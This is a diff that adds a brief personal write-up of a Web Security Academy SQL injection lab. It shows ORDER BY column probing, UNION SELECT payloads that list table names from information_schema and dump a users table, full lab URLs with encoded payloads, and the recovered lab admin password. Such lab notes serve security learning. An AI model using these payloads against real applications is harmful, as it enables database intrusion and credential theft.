@@ -1,0 +1,18 @@
+Lab: SQL injection attack, listing the database contents on non-Oracle databases
+ ' ORDER BY 1-- .. Order by title
+ ' ORDER BY 2-- .. Order by paragraph
+ ' ORDER BY 3-- .. internal error
+
+ Got list of table names with the following:
+ https://ac8b1ff71fc07672c0105718002a0001.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20null,%20table_name%20from%20information_schema.tables--
+ Payload used: ' UNION SELECT null, table_name from information_schema.tables
+Found interesting table called: `users_oqkpxj`
+
+Got admin credentials by querying table `users_oqkpxj`:
+https://ac8b1ff71fc07672c0105718002a0001.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20*%20from%20users_oqkpxj--
+Payload used: ' UNION SELECT * from users_oqkpxj--
+
+admin password: 26dodbam0nuai5858ilz
+
+
+
